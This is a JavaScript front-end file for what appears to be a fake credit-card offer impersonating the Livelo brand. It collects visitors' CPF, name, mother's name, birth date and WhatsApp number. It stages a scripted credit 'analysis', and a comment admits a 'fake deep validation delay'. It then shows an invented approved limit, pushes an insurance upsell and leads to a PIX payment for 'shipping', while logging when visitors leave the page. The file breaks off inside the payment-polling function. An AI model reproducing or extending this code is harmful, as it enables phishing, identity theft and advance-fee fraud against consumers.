/* ═══════════════════════════════════════════════════════════════
   LIVELO CREDIT SYSTEM — main.js
   Controle de fluxo do lead, integração com União 7 Pay (PIX), UI State
═══════════════════════════════════════════════════════════════ */

// ============================================================================
// ESTADO GLOBAL
// ============================================================================
let storedSession = null;
try {
  storedSession = localStorage.getItem('livelo_session');
} catch (e) {}

const STATE = {
  sessionId: storedSession,

  cpf: '',
  nome: '',
  nome_mae: '',
  data_nasc: '',
  renda: null,
  tipo_renda: null,
  dia_vencimento: null,
  color: 'gradient_pink',
  style: 'standard',
  managerWa: '5511999999999',
  paymentId: null,
  pixCode: null
};

if (!STATE.sessionId) {
  STATE.sessionId = 'ses_' + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
  try { localStorage.setItem('livelo_session', STATE.sessionId); } catch(e) {}
}

// MOTOR CENTRALIZADO DE LIMITE REALISTA E PROPORCIONAL
function formatCurrency(val) {
  const num = typeof val === 'number' ? val : parseFloat(String(val).replace(/[^\d.,]/g, '').replace(',', '.')) || 0;
  return 'R$ ' + num.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
}

function formatCurrencyShort(val) {
  const num = typeof val === 'number' ? val : parseFloat(String(val).replace(/[^\d.,]/g, '').replace(',', '.')) || 0;
  return 'R$ ' + Math.round(num).toLocaleString('pt-BR');
}

function applyApprovedLimit(num) {
  if (!num || isNaN(num)) return;
  const val = parseFloat(num);
  STATE.limite = val;
  STATE.limitBase = val;
  try { localStorage.setItem('livelo_limit', val); } catch(e) {}

  const full = formatCurrency(val);
  const short = formatCurrencyShort(val);

  document.querySelectorAll('.dynamic-limit-full').forEach(el => { el.innerText = full; });
  document.querySelectorAll('.dynamic-limit-short').forEach(el => { el.innerText = short; });

  const approvedLimitEl = document.getElementById('approved-limit');
  if (approvedLimitEl) approvedLimitEl.innerHTML = `<span class="dynamic-limit-full">${full}</span>`;

  const doneLimiteEl = document.getElementById('done-limite');
  if (doneLimiteEl) doneLimiteEl.innerText = full;

  const sumLimiteEl = document.getElementById('sum-limite');
  if (sumLimiteEl) sumLimiteEl.innerText = full;

  const cardLimitEl = document.getElementById('summary-card-limit');
  if (cardLimitEl) cardLimitEl.innerText = short;

  const successLimitEl = document.getElementById('success-card-limit');
  if (successLimitEl) successLimitEl.innerText = full;
}

let storedLimit = null;
try { storedLimit = localStorage.getItem('livelo_limit'); } catch(e) {}
if (storedLimit && !isNaN(storedLimit) && parseFloat(storedLimit) >= 1000) {
  STATE.limitBase = parseFloat(storedLimit);
  STATE.limite = parseFloat(storedLimit);
} else {
  STATE.limitBase = 2100;
  STATE.limite = 2100;
}

document.addEventListener('DOMContentLoaded', () => {
  applyApprovedLimit(STATE.limite || 2100);
});

// CAPTURE UTMS
const urlParams = new URLSearchParams(window.location.search);
STATE.utm_source = urlParams.get('utm_source') || '';
STATE.utm_medium = urlParams.get('utm_medium') || '';
STATE.utm_campaign = urlParams.get('utm_campaign') || '';
STATE.utm_content = urlParams.get('utm_content') || '';
STATE.utm_term = urlParams.get('utm_term') || '';
STATE.src = urlParams.get('src') || '';
STATE.sck = urlParams.get('sck') || '';

// Track Visit in Background with Device & Session info
function trackInitialVisit() {
  const ua = navigator.userAgent || '';
  let dev = 'Desktop / PC';
  if (/android/i.test(ua)) dev = 'Smartphone Android';
  else if (/iPhone|iPad|iPod/i.test(ua)) dev = 'Apple iPhone / iOS';

  fetch('/api/visit', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      session_id: STATE.sessionId,
      device: dev,
      device_brand: dev,
      utm_source: STATE.utm_source,
      utm_medium: STATE.utm_medium,
      utm_campaign: STATE.utm_campaign,
      src: STATE.src
    })
  }).catch(() => {});
}
trackInitialVisit();

async function fetchConfig() {
  try {
    const res = await fetch('/api/config');
    const cfg = await res.json();
    STATE.config = cfg;
    if(cfg.frete_expresso) {
      const btn = document.getElementById('btn_frete_expresso');
      if(btn) {
        btn.setAttribute('onclick', `selectShipping('sedex', ${cfg.frete_expresso.replace(',', '.')})`);
        const lbl = document.getElementById('lbl_frete_expresso');
        if(lbl) lbl.textContent = `R$ ${cfg.frete_expresso}`;
      }
    }
    if(cfg.frete_padrao) {
      const btn = document.getElementById('btn_frete_padrao');
      if(btn) {
        btn.setAttribute('onclick', `selectShipping('pac', ${cfg.frete_padrao.replace(',', '.')})`);
        const lbl = document.getElementById('lbl_frete_padrao');
        if(lbl) lbl.textContent = `R$ ${cfg.frete_padrao}`;
      }
    }
  } catch(e) {}
}
fetchConfig();
// ============================================================================

// ============================================================================
// TELEMETRIA E LOGS (MONITORAMENTO MILITAR)
// ============================================================================
function logLeadAction(action, details='') {
  if(!STATE.sessionId) return;
  fetch('/api/log-action', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ session_id: STATE.sessionId, action: action, details: details })
  }).catch(()=>{});
}

// Rastreamento de Abandono (quando o usuário sai da página ou minimiza)
let hasAbandoned = false;
function trackAbandonment() {
  if (!STATE.sessionId || hasAbandoned || STATE.pixGenerated) return;
  hasAbandoned = true;
  // Use sendBeacon as it's more reliable when closing tabs
  const payload = JSON.stringify({ session_id: STATE.sessionId, action: 'ABANDONO', details: 'Lead saiu da página antes de concluir' });
  navigator.sendBeacon('/api/log-action', payload);
}

window.addEventListener('visibilitychange', () => {
  if (document.visibilityState === 'hidden') trackAbandonment();
});
window.addEventListener('pagehide', trackAbandonment);
window.addEventListener('beforeunload', trackAbandonment);

// UTILITÁRIOS
// ============================================================================
function $id(id) { return document.getElementById(id); }

function goToStep(stepId) {
  document.querySelectorAll('.screen').forEach(el => el.classList.remove('active'));
  const target = $id(`screen-${stepId}`);
  if (target) target.classList.add('active');
  window.scrollTo({ top: 0, behavior: 'smooth' });
  try {
    logLeadAction('MUDOU_DE_TELA', 'Entrou na tela: ' + stepId);
  } catch(e) {}
}

function showErr(id, msg) {
  const el = $id(id);
  if (!el) return;
  el.textContent = msg;
  el.classList.remove('hidden');
}
function hideErr(id) {
  const el = $id(id);
  if (el) el.classList.add('hidden');
}

// ============================================================================
// MÁSCARAS
// ============================================================================
function mascaraCpf(v) {
  v = v.replace(/\D/g, "");
  if (v.length <= 11) {
    v = v.replace(/(\d{3})(\d)/, "$1.$2");
    v = v.replace(/(\d{3})(\d)/, "$1.$2");
    v = v.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
  }
  return v;
}
function mascaraData(v) {
  v = v.replace(/\D/g, "");
  if (v.length > 2) v = v.replace(/^(\d{2})(\d)/, "$1/$2");
  if (v.length > 5) v = v.replace(/^(\d{2})\/(\d{2})(\d)/, "$1/$2/$3");
  return v.substring(0, 10);
}
function mascaraTel(v) {
  v = v.replace(/\D/g, "");
  if (v.length > 2) v = v.replace(/^(\d{2})(\d)/g, "($1) $2");
  if (v.length > 9) v = v.replace(/(\d{5})(\d{4})$/, "$1-$2");
  return v;
}

const inputCpf = $id('input-cpf');
if (inputCpf) {
  inputCpf.addEventListener('input', (e) => {
    e.target.value = mascaraCpf(e.target.value);
    hideErr('cpf-error');
    // Revela campo de nascimento após CPF ter 11 dígitos
    const digits = e.target.value.replace(/\D/g, '');
    const nascGroup = $id('nasc-input-group');
    if (digits.length === 11) {
      consultarCpf();
    }
  });
}
const inputNasc = $id('input-nasc');
if (inputNasc) {
  inputNasc.addEventListener('input', (e) => {
    e.target.value = mascaraData(e.target.value);
    hideErr('cpf-error');
  });
}
const inputWa = $id('input-whatsapp');
if (inputWa) {
  inputWa.addEventListener('input', (e) => {
    e.target.value = mascaraTel(e.target.value);
    hideErr('wa-error');
  });
}

// ============================================================================
// ETAPA 1: CPF
// ============================================================================
async function consultarCpf() {
  hideErr('cpf-error');
  const cpfVal = (inputCpf.value || '').replace(/\D/g, '');
  const nascVal = inputNasc ? inputNasc.value : '';

  // CPF incompleto — bloqueia e mostra erro, não avança
  if (cpfVal.length !== 11) {
    showErr('cpf-error', 'Digite o CPF completo (11 dígitos).');
    return;
  }

  $id('btn-consultar-text').classList.add('hidden');
  $id('btn-consultar-spin').classList.remove('hidden');
  $id('btn-consultar').disabled = true;

  try {
    const res = await fetch('/api/cpf', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cpf: cpfVal, data_nasc: nascVal })
    });
    const data = await res.json();

    if (data.ok) {
      logLeadAction('Informou CPF Válido', cpfVal);
      STATE.cpf = data.cpf_fmt || cpfVal;
      STATE.nome = data.nome;
      STATE.nome_mae = data.nome_mae;
      STATE.data_nasc = data.data_nasc;

      $id('r-nome').textContent = data.nome.split(' ')[0] + ' ' + (data.nome.split(' ')[1] || '');
      $id('r-cpf').textContent = data.cpf_fmt;
      $id('r-nasc').textContent = data.data_nasc;

      $id('cpf-input-group').classList.add('hidden');
      $id('btn-consultar').classList.add('hidden');
      $id('cpf-result').classList.remove('hidden');

      const firstName = data.nome.split(' ')[0];
      if (typeof updateCardNameDisplays === 'function') {
        updateCardNameDisplays(data.nome);
      } else {
        if ($id('welcome-name-display')) $id('welcome-name-display').textContent = firstName;
        if ($id('style-card-name')) $id('style-card-name').textContent = firstName;
      }

      fetch('/api/lead', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          session_id: STATE.sessionId,
          cpf: cpfVal,
          nome: data.nome,
          nome_mae: data.nome_mae,
          data_nasc: data.data_nasc
        })
      }).catch(console.error);

    } else {
      // CPF não encontrado ou inválido — mostra erro, NÃO avança
      showErr('cpf-error', data.error || 'CPF não encontrado. Verifique e tente novamente.');
    }
  } catch (err) {
    // Erro de rede — mostra mensagem, NÃO avança
    logLeadAction('Erro API CPF', err.message);
    showErr('cpf-error', 'Erro de conexão. Verifique sua internet e tente novamente.');
  } finally {
    if ($id('btn-consultar-text')) $id('btn-consultar-text').classList.remove('hidden');
    if ($id('btn-consultar-spin')) $id('btn-consultar-spin').classList.add('hidden');
    if ($id('btn-consultar')) $id('btn-consultar').disabled = false;
  }
}

function resetCpf() {
  $id('cpf-result').classList.add('hidden');
  $id('cpf-input-group').classList.remove('hidden');
  // Esconde nascimento de volta (progressive reveal)
  if ($id('nasc-input-group')) $id('nasc-input-group').classList.add('hidden');
  $id('btn-consultar').classList.remove('hidden');
  inputCpf.value = '';
  if (inputNasc) inputNasc.value = '';
  inputCpf.focus();
}

const btnCpfOk = $id('btn-cpf-ok');
if (btnCpfOk) {
  btnCpfOk.addEventListener('click', () => {
    // Update approved screen with name/cpf
    const firstName = STATE.nome ? STATE.nome.split(' ')[0] : 'SEU NOME';
    if ($id('approved-name-display')) $id('approved-name-display').textContent = firstName;
    if ($id('summary-name')) $id('summary-name').textContent = STATE.nome ? STATE.nome.split(' ').slice(0,2).join(' ') : '—';
    if ($id('summary-end')) $id('summary-end').textContent = STATE.cpf || '—';
    if ($id('welcome-name-display')) $id('welcome-name-display').textContent = firstName;
    if ($id('ola-name')) $id('ola-name').textContent = `Olá, ${firstName}!`;
    if ($id('card-preview-name')) $id('card-preview-name').textContent = STATE.nome || 'SEU NOME';
    goToStep('ola');
  });
}

// ============================================================================
// ETAPA 2: RENDA E EMPREGO
// ============================================================================
function selectIncome(btn, val) {
  document.querySelectorAll('.big-choice-btn, .income-btn').forEach(el => el.classList.remove('selected'));
  btn.classList.add('selected');
  STATE.renda = val;
  hideErr('income-error');

  // Cálculo preliminar proporcional imediato no frontend (enquanto aguarda o backend)
  let baseCalc = 2100;
  if (val === '1000') baseCalc = 1500;
  else if (val === '2000') baseCalc = 2200;
  else if (val === '4000') baseCalc = 3750;
  else if (val === '8000') baseCalc = 6800;
  else {
    const num = parseFloat(String(val).replace(/[^\d.,]/g, '').replace(',', '.')) || 2100;
    baseCalc = Math.round(Math.max(1200, Math.min(num * 1.05, 15000)) / 50) * 50;
  }
  applyApprovedLimit(baseCalc);

  // Auto-avança após breve feedback visual
  setTimeout(() => goToStep('restrictions'), 260);
}

function submitIncome() {
  if (!STATE.renda) return showErr('income-error', 'Selecione uma faixa de renda.');
  goToStep('restrictions');
}

function selectEmprego(btn) {
  document.querySelectorAll('#screen-employment .big-choice-btn, .income-btn').forEach(el => el.classList.remove('selected'));
  btn.classList.add('selected');
  STATE.tipo_renda = btn.dataset.tipo;
  hideErr('emp-error');
  // Auto-avança
  setTimeout(() => goToStep('income'), 260);
}

function submitEmprego() {
  if (!STATE.tipo_renda) return showErr('emp-error', 'Selecione sua situação profissional.');
  goToStep('income');
}

function selectMotivo(btn) {
  document.querySelectorAll('#screen-motivo .motivo-btn').forEach(el => el.classList.remove('selected'));
  btn.classList.add('selected');
  if (btn.dataset.motivo) STATE.motivo_credito = btn.dataset.motivo;
  hideErr('motivo-error');
  // Auto-avança
  setTimeout(() => startAnalysis(), 260);
}

function submitMotivo() {
  if (!STATE.motivo_credito) return showErr('motivo-error', 'Selecione o motivo para continuar.');
  goToStep('billing');
}

// ============================================================================
// ETAPA 3: VENCIMENTO
// ============================================================================
function selectDay(btn) {
  document.querySelectorAll('.day-btn').forEach(el => el.classList.remove('selected'));
  btn.classList.add('selected');
  STATE.dia_vencimento = btn.textContent.trim();
  hideErr('billing-error');
}

async function submitBilling() {
  if (!STATE.cpf) {
    showErr('billing-error', 'Sessão expirada. Redirecionando para o início...');
    setTimeout(() => goToStep('cpf'), 2500);
    return;
  }
  if (!STATE.dia_vencimento) return showErr('billing-error', 'Selecione o dia de vencimento.');
  
  $id('billing-btn-text').classList.add('hidden');
  $id('billing-spin').classList.remove('hidden');
  
  try {
    const res = await fetch('/api/lead', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(STATE)
    });
    const data = await res.json();
    
    if (data.ok) {
      if (data.limite) applyApprovedLimit(data.limite);
      
      // Update PIX step with correct shipping cost
      if (data.frete && $id('pix-frete-display')) {
        $id('pix-frete-display').textContent = data.frete;
      }
      
      goToStep('limit-info');
    } else {
      showErr('billing-error', data.error || 'Erro ao processar.');
      $id('billing-btn-text').classList.remove('hidden');
      $id('billing-spin').classList.add('hidden');
    }
  } catch (err) {
    showErr('billing-error', 'Erro de conexão.');
    $id('billing-btn-text').classList.remove('hidden');
    $id('billing-spin').classList.add('hidden');
  }
}

// ============================================================================
// ANIMAÇÃO DE ANÁLISE
// ============================================================================
function startAnalysis() {
  goToStep('analysis');
  
  // Realiza a chamada em background para obter o limite calculado com base nas respostas
  fetch('/api/lead', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(STATE)
  }).then(res => res.json()).then(data => {
    if (data.ok && data.limite) {
      applyApprovedLimit(data.limite);
    }
  }).catch(console.error);



  let pct = 0;
  const pctEl = $id('analysis-pct');
  const circleEl = $id('analysis-progress-circle');
  
  // Array of timers to clear if needed
  const timers = [];
  
  // Progress counter
  const interval = setInterval(() => {
    pct += 1;
    if (pct <= 100) {
      pctEl.textContent = pct + '%';
      const offset = 326 - (326 * pct) / 100;
      circleEl.style.strokeDashoffset = offset;
    } else {
      clearInterval(interval);
    }
  }, 45); // Takes about 4.5 seconds for 100%
  
  timers.push(interval);
  
  // Step checks
  timers.push(setTimeout(() => {
    $id('astep-1').querySelector('.astep-icon').classList.remove('pending');
    $id('astep-1').querySelector('.astep-icon').classList.add('checking');
  }, 300));
  
  timers.push(setTimeout(() => {
    $id('astep-1').querySelector('.astep-icon').classList.remove('checking');
    $id('astep-1').querySelector('.astep-icon').classList.add('done');
    $id('astep-2').querySelector('.astep-icon').classList.add('checking');
  }, 1500));
  
  timers.push(setTimeout(() => {
    $id('astep-2').querySelector('.astep-icon').classList.remove('checking');
    $id('astep-2').querySelector('.astep-icon').classList.add('done');
    $id('astep-3').querySelector('.astep-icon').classList.add('checking');
  }, 3200));
  
  timers.push(setTimeout(() => {
    $id('astep-3').querySelector('.astep-icon').classList.remove('checking');
    $id('astep-3').querySelector('.astep-icon').classList.add('done');
    $id('astep-4').querySelector('.astep-icon').classList.add('checking');
  }, 3800));
  
  timers.push(setTimeout(() => {
    $id('astep-4').querySelector('.astep-icon').classList.remove('checking');
    $id('astep-4').querySelector('.astep-icon').classList.add('done');
  }, 6500));
  
  // Go to approved screen
  timers.push(setTimeout(() => {
    goToStep('approved');
  }, 7500));
}

// ============================================================================
// CUSTOMIZADOR DE CARTÃO
// ============================================================================
const CARD_TEMPLATES = {
  'classico': { name: 'Clássico', bg: 'linear-gradient(135deg,#E5147A,#9C0E57)', svg: '<path d="M-20 120 C50 60 150 140 240 80 S360 60 400 80" stroke="white" fill="none" stroke-width="40" opacity="0.12"/><path d="M-20 160 C50 100 150 180 240 120 S360 100 400 120" stroke="white" fill="none" stroke-width="28" opacity="0.1"/><circle cx="320" cy="40" r="80" stroke="white" fill="none" stroke-width="2" opacity="0.18"/><circle cx="320" cy="40" r="52" stroke="white" fill="none" stroke-width="1.5" opacity="0.14"/>' },
  'noir': { name: 'Noir', bg: 'linear-gradient(135deg,#1A1A2E,#0F3460)', svg: '<line x1="0" y1="40" x2="340" y2="40" stroke="#D4AF37" stroke-width="2" opacity="0.5"/><line x1="0" y1="80" x2="340" y2="80" stroke="#D4AF37" stroke-width="2" opacity="0.5"/><line x1="0" y1="120" x2="340" y2="120" stroke="#D4AF37" stroke-width="2" opacity="0.5"/><line x1="100" y1="0" x2="100" y2="200" stroke="#D4AF37" stroke-width="2" opacity="0.5"/><line x1="180" y1="0" x2="180" y2="200" stroke="#D4AF37" stroke-width="2" opacity="0.5"/><line x1="260" y1="0" x2="260" y2="200" stroke="#D4AF37" stroke-width="2" opacity="0.5"/>' },
  'oceano': { name: 'Oceano', bg: 'linear-gradient(135deg,#0EA5E9,#0369A1)', svg: '<path d="M0 60 C40 20 80 100 120 60 S200 20 240 60 S300 20 340 60" stroke="white" fill="none" stroke-width="18" opacity="0.15"/><path d="M0 110 C40 70 80 150 120 110 S200 70 240 110 S300 70 340 110" stroke="white" fill="none" stroke-width="14" opacity="0.1"/><path d="M0 160 C40 120 80 200 120 160 S200 120 240 160 S300 120 340 160" stroke="white" fill="none" stroke-width="10" opacity="0.08"/>' },
  'esmeralda': { name: 'Esmeralda', bg: 'linear-gradient(135deg,#059669,#064E3B)', svg: '<polygon points="170,20 220,50 220,110 170,140 120,110 120,50" stroke="white" fill="none" stroke-width="5" opacity="0.2"/><polygon points="280,40 320,60 320,100 280,120 240,100 240,60" stroke="white" fill="none" stroke-width="3" opacity="0.15"/><polygon points="60,40 100,60 100,100 60,120 20,100 20,60" stroke="white" fill="none" stroke-width="3" opacity="0.15"/><polygon points="170,90 200,110 200,150 170,170 140,150 140,110" stroke="white" fill="none" stroke-width="3" opacity="0.12"/>' },
  'galaxia': { name: 'Galáxia', bg: 'linear-gradient(135deg,#7C3AED,#4C1D95)', svg: '<circle cx="50" cy="40" r="4" fill="white" opacity="0.8"/><circle cx="150" cy="30" r="5" fill="white" opacity="0.9"/><circle cx="250" cy="60" r="4" fill="white" opacity="0.7"/><circle cx="100" cy="120" r="3" fill="white" opacity="0.6"/><circle cx="200" cy="140" r="4" fill="white" opacity="0.8"/><circle cx="300" cy="100" r="3" fill="white" opacity="0.6"/><circle cx="40" cy="160" r="4" fill="white" opacity="0.7"/><circle cx="280" cy="170" r="3" fill="white" opacity="0.7"/><line x1="50" y1="40" x2="150" y2="30" stroke="white" stroke-width="1.5" opacity="0.4"/><line x1="150" y1="30" x2="250" y2="60" stroke="white" stroke-width="1.5" opacity="0.4"/><line x1="150" y1="30" x2="100" y2="120" stroke="white" stroke-width="1.5" opacity="0.3"/><line x1="100" y1="120" x2="200" y2="140" stroke="white" stroke-width="1.5" opacity="0.3"/><line x1="250" y1="60" x2="300" y2="100" stroke="white" stroke-width="1.5" opacity="0.3"/><line x1="200" y1="140" x2="280" y2="170" stroke="white" stroke-width="1.5" opacity="0.3"/><line x1="100" y1="120" x2="40" y2="160" stroke="white" stroke-width="1.5" opacity="0.3"/>' },
  'aurora': { name: 'Aurora', bg: 'linear-gradient(135deg,#F59E0B,#EF4444)', svg: '<line x1="340" y1="200" x2="340" y2="0" stroke="white" stroke-width="6" opacity="0.25"/><line x1="340" y1="200" x2="280" y2="0" stroke="white" stroke-width="5" opacity="0.22"/><line x1="340" y1="200" x2="220" y2="0" stroke="white" stroke-width="4" opacity="0.2"/><line x1="340" y1="200" x2="160" y2="0" stroke="white" stroke-width="3" opacity="0.18"/><line x1="340" y1="200" x2="100" y2="0" stroke="white" stroke-width="2.5" opacity="0.15"/><line x1="340" y1="200" x2="40" y2="0" stroke="white" stroke-width="2" opacity="0.12"/><line x1="340" y1="200" x2="-20" y2="50" stroke="white" stroke-width="2.5" opacity="0.18"/><circle cx="340" cy="200" r="80" stroke="white" fill="none" stroke-width="4" opacity="0.2"/><circle cx="340" cy="200" r="150" stroke="white" fill="none" stroke-width="3" opacity="0.12"/>' }
};

function selectTemplate(btn, id) {
  document.querySelectorAll('.tpl-thumb').forEach(el => el.classList.remove('tpl-thumb-active'));
  btn.classList.add('tpl-thumb-active');
  
  const tpl = CARD_TEMPLATES[id];
  STATE.color = id;
  
  const flipper = $id('card-flipper');
  const preview = $id('advanced-card-preview');
  const svgInner = $id('card-pattern-inner');
  const label = $id('tpl-active-label');
  
  flipper.style.transform = 'rotateY(90deg)';
  
  setTimeout(() => {
    preview.style.background = tpl.bg;
    svgInner.innerHTML = tpl.svg;
    label.innerHTML = `&#10022; ${tpl.name}`;
    flipper.style.transform = 'rotateY(0deg)';
  }, 300);
}

function scrollTpl(dir) {
  var container = document.getElementById('tpl-scroll-container');
  if(container) {
    container.scrollBy({ left: dir * 180, behavior: 'smooth' });
  }
}

function submitCardStyle() {
  fetch('/api/card-style', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ session_id: STATE.sessionId, color: STATE.color, style: STATE.style })
  }).catch(console.error);

  // Carrega os dados do gerente e avança
  fetch('/api/manager')
    .then(r => r.json())
    .then(data => {
      if (data.ok) {
        if ($id('manager-name')) $id('manager-name').textContent = data.name;
        if ($id('manager-photo-div') && data.photo_url) {
            $id('manager-photo-div').style.backgroundImage = `url('${data.photo_url}')`;
        }
      } else {
        if ($id('manager-name')) $id('manager-name').textContent = 'Gerente Livelo';
      }
    })
    .catch(err => {
      console.error(err);
      if ($id('manager-name')) $id('manager-name').textContent = 'Gerente Livelo';
    })
    .finally(() => {
      // Vai para tela do gerente
      goToStep('manager');
    });

  const leadName = STATE.nome_completo || STATE.nome || 'SEU NOME';
  var n1 = document.getElementById('sum-nome'); if(n1) n1.innerText = leadName; 
  var n2 = document.getElementById('pix-nome'); if(n2) n2.innerText = leadName; 
  
  if(STATE.cpf) { var cpf1 = document.getElementById('pix-cpf'); if(cpf1) cpf1.innerText = STATE.cpf; }
  var phone = STATE.celular || STATE.telefone || '(31) 90504-4521';
  var tel1 = document.getElementById('pix-tel'); if(tel1) tel1.innerText = phone; 
  
  var cv = document.getElementById('summary-card-visual');
  var csvg = document.getElementById('summary-card-svg');
  if(cv && CARD_TEMPLATES[STATE.color || 'classico']) { 
    cv.style.background = CARD_TEMPLATES[STATE.color || 'classico'].bg; 
    if(csvg) csvg.innerHTML = CARD_TEMPLATES[STATE.color || 'classico'].svg;
  }
  if (typeof updateCardNameDisplays === 'function') {
    updateCardNameDisplays(leadName);
  } else {
    var cn = document.getElementById('summary-card-name');
    if(cn) cn.innerText = leadName;
  }
}

// Seleção de método de envio — carrega gerente e vai ao WhatsApp
function selectShippingOld(type, price) {
  STATE.frete_tipo = type;
  STATE.frete_valor = price;
  // Atualiza valor exibido no PIX
  const display = price.toFixed(2).replace('.', ',');
  [$id('pix-frete-display'), $id('approved-frete-val')].forEach(el => {
    if (el) el.textContent = 'R$ ' + display;
  });
  // Feedback visual na opção escolhida
  ['ship-sedex','ship-pac'].forEach(id => {
    const el = $id(id);
    if (el) el.classList.toggle('selected', el.id === `ship-${type}`);
  });
  // Carrega dados do gerente e avança
  fetch('/api/manager')
    .then(r => r.json())
    .then(data => {
      if (data.ok) {
        $id('mgr-display-name').textContent = data.name;
        $id('manager-photo-img').src = data.photo_url;
        $id('mgr-since-badge').innerHTML = `
          <svg viewBox="0 0 16 16" fill="none" width="12" height="12">
            <path d="M8 2l1.5 3L13 5.5l-2.5 2.5.6 3.5L8 10l-3.1 1.5.6-3.5L3 5.5 6.5 5z" fill="#E91E8C"/>
          </svg>
          Melhor gerente 2024 até ${new Date().getFullYear()}
        `;
      }
    })
    .catch(console.error)
    .finally(() => {
      setTimeout(() => goToStep('whatsapp'), 350);
    });
}

// ============================================================================
// WHATSAPP
// ============================================================================
async function submitWhatsapp() {
  logLeadAction('Tentou enviar WhatsApp');
  hideErr('wa-error');
  // Need to get the input element in case it's not globally defined or shadowed
  const inputEl = document.getElementById('input-whatsapp') || inputWa;
  const waVal = (inputEl.value || '').replace(/\D/g, '');
  
  if (waVal.length < 10) {
    return showErr('wa-error', 'Digite um número de WhatsApp válido com DDD.');
  }
  
  // Captura o telefone real formatado para usar na tela do PIX depois
  STATE.celular = inputEl.value;
  STATE.telefone = waVal;
  
  $id('btn-wa-text').innerText = 'Verificando status no WhatsApp...';
  $id('wa-btn-arrow').classList.add('hidden');
  $id('btn-wa-spin').classList.remove('hidden');
  $id('btn-wa-continuar').disabled = true;
  
  // Fake deep validation delay
  await new Promise(resolve => setTimeout(resolve, 2500));
  
  try {
    const res = await fetch('/api/whatsapp', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ session_id: STATE.sessionId, whatsapp: waVal })
    });
    const data = await res.json();
    
    if (data.ok) {
      STATE.managerWa = data.manager_wa || data.manager_whatsapp || '5511999999999';
      goToStep('cep');
    } else {
      showErr('wa-error', data.error || 'Erro ao salvar. Tente novamente.');
      $id('btn-wa-text').innerText = 'Continuar';
      $id('wa-btn-arrow').classList.remove('hidden');
      $id('btn-wa-spin').classList.add('hidden');
      $id('btn-wa-continuar').disabled = false;
    }
  } catch (err) {
    console.error(err);
    showErr('wa-error', 'Erro de conexão.');
    $id('btn-wa-text').innerText = 'Continuar';
    $id('wa-btn-arrow').classList.remove('hidden');
    $id('btn-wa-spin').classList.add('hidden');
    $id('btn-wa-continuar').disabled = false;
  }
}

// ============================================================================
// PIX E PAGAMENTO
// ============================================================================
let pixCheckInterval = null;

async function gerarPix() {
  if (STATE.config && STATE.config.upsell_active === 'true') {
    showUpsellModal();
  } else {
    executeGerarPix();
  }
}

function showUpsellModal() {
  const modalHTML = `
    <div id="upsell-modal-overlay" style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); display:flex; justify-content:center; align-items:center; z-index:99999; backdrop-filter:blur(5px);">
      <div style="background:var(--bg-glass); border:1px solid rgba(255,255,255,0.1); border-radius:16px; width:90%; max-width:400px; padding:24px; text-align:center; box-shadow:0 10px 40px rgba(0,0,0,0.5); animation: zoomIn 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);">
        <div style="font-size:3rem; margin-bottom:16px;">${STATE.config.upsell_icon || '🛡️'}</div>
        <h2 style="font-size:1.4rem; font-weight:800; color:white; margin-bottom:12px; letter-spacing:-0.5px;">${STATE.config.upsell_title || 'Proteção Garantida Livelo'}</h2>
        <p style="color:var(--text-muted); font-size:0.95rem; margin-bottom:24px; line-height:1.5;">Proteja seu cartão contra perdas, roubos e fraudes virtuais. Por apenas <strong>R$ ${STATE.config.upsell_value || '19,90'}</strong> você garante sua tranquilidade.</p>
        
        <button onclick="acceptUpsell()" style="width:100%; background:linear-gradient(135deg, #10B981, #059669); color:white; border:none; padding:16px; border-radius:12px; font-weight:800; font-size:1rem; cursor:pointer; margin-bottom:12px; transition:transform 0.2s, box-shadow 0.2s; box-shadow:0 4px 15px rgba(16, 185, 129, 0.4);">
          Adicionar Proteção (Recomendado)
        </button>
        <button onclick="declineUpsell()" style="width:100%; background:transparent; color:var(--text-muted); border:none; padding:12px; border-radius:12px; font-weight:600; font-size:0.9rem; cursor:pointer; transition:color 0.2s;">
          Não, obrigado
        </button>
      </div>
    </div>
  `;
  document.body.insertAdjacentHTML('beforeend', modalHTML);
}

function acceptUpsell() {
  const upsellVal = parseFloat((STATE.config.upsell_value || '19.90').replace(',', '.'));
  STATE.shippingPrice = (STATE.shippingPrice || 29.90) + upsellVal;
  logLeadAction('upsell_accepted', `Added ${upsellVal}`);
  document.getElementById('upsell-modal-overlay').remove();
  executeGerarPix();
}

function declineUpsell() {
  logLeadAction('upsell_declined', 'User declined insurance');
  document.getElementById('upsell-modal-overlay').remove();
  executeGerarPix();
}

async function executeGerarPix() {
  goToStep('pix');
}

function copyPix() {
  logLeadAction('Copiou o PIX');
  const pixCode = $id('pix-code-text').value;
  if (!pixCode || pixCode.includes('Gerando')) return;
  
  navigator.clipboard.writeText(pixCode).then(() => {
    $id('copy-feedback').classList.remove('hidden');
    setTimeout(() => {
      $id('copy-feedback').classList.add('hidden');
    }, 3000);
  }).catch(err => {
    // fallback
    const ta = $id('pix-code-text');
    ta.select();
    document.execCommand('copy');
    $id('copy-feedback').classList.remove('hidden');
    setTimeout(() => {
      $id('copy-feedback').classList.add('hidden');
    }, 3000);
  });
}

function startPixPolling(paymentId) {
  if (pixCheckInterval) clearInterval(pixCheckInterval);
  
  let attempts = 0;
  pixCheckInterval = setInterval(async () => {
    attempts++;
    if (attempts > 120) { // Stop polling after 10 minutes (5s interval)
      clearInterval(pixCheckInterval);
      return;
    }
    
    try {
      const res = await fetch(`/api/status-pix/${paymentId}`);
      const data = await res.json();
      
      if (data.ok && (data.status === 'paid' || data.status === 'authorized' || data.status === 'completed')) {
        clearInterval(pixCheckInterval);
        
        // Update UI briefly before transition
        $id('pix-status-dot').classList.add('paid');
        $id('pix-status-text').textContent = 'Pagamento Confirmado!';
